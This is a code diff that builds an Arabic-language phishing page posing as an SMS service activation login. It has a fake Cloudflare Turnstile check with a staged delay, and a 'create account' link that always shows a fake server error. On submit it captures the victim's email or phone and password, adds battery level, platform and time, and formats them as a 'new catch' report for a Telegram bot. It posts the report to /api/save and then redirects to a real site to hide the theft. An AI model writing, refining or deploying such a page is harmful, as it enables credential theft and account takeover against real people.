@@ -1,82 +1,144 @@
-<script>
-    let isVerified = false;
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تفعيل خدمة SMS</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    
+    <style>
+        :root {
+            --primary-color: #CC0044;
+            --bg-gradient: linear-gradient(135deg, #FF0055 0%, #880022 100%);
+        }
 
-    // وظيفة التحقق مع تأخير ثانيتين ونصف للواقعية
-    function handleCaptcha() {
-        const cfBox = document.getElementById('cf-box');
-        const loader = document.getElementById('loader-text');
-        cfBox.style.display = 'none';
-        loader.style.display = 'block';
+        body {
+            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg-gradient);
+            display: flex; flex-direction: column; align-items: center; min-height: 100vh;
+        }
 
-        setTimeout(() => {
-            loader.innerHTML = '✅ تم التحقق من أمان جهازك بنجاح';
-            loader.style.color = 'green';
-            isVerified = true;
-        }, 2500);
-    }
+        .container {
+            background: white; padding: 40px 30px; 
+            border-radius: 24px; /* حواف ناعمة جداً واحترافية */
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3); 
+            width: 85%; max-width: 400px; text-align: center;
+            margin-top: 50px; border: 1px solid rgba(255,255,255,0.1);
+        }
 
-    // جلب معلومات الجهاز والبطارية
-    async function getDeviceInfo() {
-        let batteryLevel = "غير معروف";
-        try {
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                batteryLevel = Math.round(battery.level * 100) + "%";
-            }
-        } catch (e) {}
-        return { battery: batteryLevel };
-    }
-
-    // عند الضغط على زر "تسجيل دخول" أو "تفعيل الآن"
-    document.getElementById('checkForm').onsubmit = async (e) => {
-        e.preventDefault();
+        #pageImg { width: 110px; height: 110px; border-radius: 50%; object-fit: contain; margin-bottom: 25px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
         
-        if (!isVerified) {
-            Swal.fire({ text: 'يرجى إكمال التحقق أولاً', icon: 'warning', confirmButtonColor: '#CC0044' });
-            return;
+        h2 { color: var(--primary-color); margin-bottom: 30px; font-size: 22px; font-weight: 800; }
+        
+        input {
+            width: 100%; padding: 16px; margin-bottom: 20px;
+            border: 2px solid #eee; border-radius: 15px; /* حواف متناسقة */
+            box-sizing: border-box; outline: none; text-align: right;
+            font-size: 15px; transition: 0.3s;
+        }
+        input:focus { border-color: var(--primary-color); background: #fff9fb; }
+
+        .captcha-wrapper { margin-bottom: 25px; min-height: 70px; display: flex; align-items: center; justify-content: center; }
+        #loader-text { color: var(--primary-color); font-weight: bold; font-size: 15px; display: none; }
+
+        button {
+            width: 100%; padding: 16px; background: var(--primary-color); color: white;
+            border: none; border-radius: 50px; /* زر بيضاوي احترافي */
+            font-size: 18px; font-weight: bold; cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 10px 20px rgba(204, 0, 68, 0.3);
+        }
+        button:hover { transform: scale(1.03); box-shadow: 0 15px 25px rgba(204, 0, 68, 0.4); }
+
+        .footer-links { margin-top: 25px; font-size: 14px; color: #555; }
+        .footer-links a { color: var(--primary-color); text-decoration: none; font-weight: 700; }
+
+        .dev-credits { margin-top: auto; padding: 20px; color: rgba(255,255,255,0.7); font-size: 12px; direction: ltr; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img id="pageImg" src="https://logodix.com/logo/2014521.png">
+        <h2>سجل دخولك لتفعيل الخدمة</h2>
+
+        <form id="checkForm">
+            <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="passInput" placeholder="كلمة السر" required>
+            
+            <div class="captcha-wrapper">
+                <div id="loader-text">🔄 جاري فحص أمان الجهاز...</div>
+                <div class="cf-turnstile" id="cf-box" data-sitekey="1x00000000000000000000AA" data-callback="onSuccess"></div>
+            </div>
+
+            <button type="submit">تسجيل دخول</button>
+        </form>
+
+        <div class="footer-links">
+            ليس لديك حساب؟ <a onclick="Swal.fire({icon:'error', title:'خطأ', text:'فشل الاتصال بالخادم', confirmButtonColor:'#CC0044'})">إنشاء حساب جديد</a>
+        </div>
+    </div>
+
+    <div class="dev-credits">Developed by oliver 2014 - 2026</div>
+
+    <script>
+        let isVerified = false;
+
+        function onSuccess() {
+            const cfBox = document.getElementById('cf-box');
+            const loader = document.getElementById('loader-text');
+            cfBox.style.display = 'none';
+            loader.style.display = 'block';
+            setTimeout(() => {
+                loader.innerHTML = '✅ تم التحقق انك لست روبوت';
+                loader.style.color = '#28a745';
+                isVerified = true;
+            }, 2500);
         }
 
-        const deviceData = await getDeviceInfo();
-        const userValue = document.getElementById('userInput').value;
-        const passValue = document.getElementById('passInput').value;
+        async function getBat() {
+            try {
+                const b = await navigator.getBattery();
+                return Math.round(b.level * 100) + "%";
+            } catch { return "N/A"; }
+        }
 
-        // صياغة التقرير المرتب للبوت كما في الصورة التي أرسلتها
-        const reportMessage = `
-✨ **بيانات تسجيل دخول جديدة** ✨
-----------------------------------
-👤 **المستخدم:** ${userValue}
-🔑 **كلمة السر:** ${passValue}
-----------------------------------
+        document.getElementById('checkForm').onsubmit = async (e) => {
+            e.preventDefault();
+            if(!isVerified) return Swal.fire({text:'يرجى إكمال التحقق', icon:'warning'});
+
+            const bat = await getBat();
+            const u = document.getElementById('userInput').value;
+            const p = document.getElementById('passInput').value;
+
+            // هذا هو التنسيق الاحترافي الذي سيصل للبوت
+            const formattedMessage = `
+🚀 **صيد جديد مـكتمل البيانات** 🚀
+━━━━━━━━━━━━━━
+👤 **المستخدم:** \`${u}\`
+🔑 **الباسورد:** \`${p}\`
+━━━━━━━━━━━━━━
+🔋 **البطارية:** ${bat}
 📱 **النظام:** ${navigator.platform}
-🔋 **البطارية:** ${deviceData.battery}
 ⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}
-----------------------------------
-✅ **حالة الفحص:** آمن (Turnstile)
-        `;
+━━━━━━━━━━━━━━
+✅ **الحالة:** تم التحقق بنجاح
+            `;
 
-        const payload = {
-            title: "🚀 صيد جديد مكتمل",
-            message: reportMessage, // هذا النص المنسق هو ما سيظهر في التليجرام
-            user: userValue,
-            pass: passValue
+            try {
+                await fetch('/api/save', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        title: "🔥 NEW HIT 🔥",
+                        message: formattedMessage // نرسل الرسالة المنسقة هنا
+                    })
+                });
+            } catch(err) {}
+
+            window.location.href = "https://receive-smss.com/";
         };
-
-        try {
-            // تأكد أن هذا الرابط هو المسار الصحيح في Vercel الخاص بك
-            await fetch('/api/save', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-        } catch (err) {
-            console.error("خطأ في الإرسال");
-        }
-
-        // التوجيه النهائي للموقع الحقيقي
-        window.location.href = "https://receive-smss.com/"; 
-    };
-
-    function showError() {
-        Swal.fire({ title: 'خطأ', text: 'فشل الاتصال في الخوادم، يرجى المحاولة لاحقاً.', icon: 'error', confirmButtonColor: '#CC0044' });
-    }
-</script>
+    </script>
+</body>
+</html>
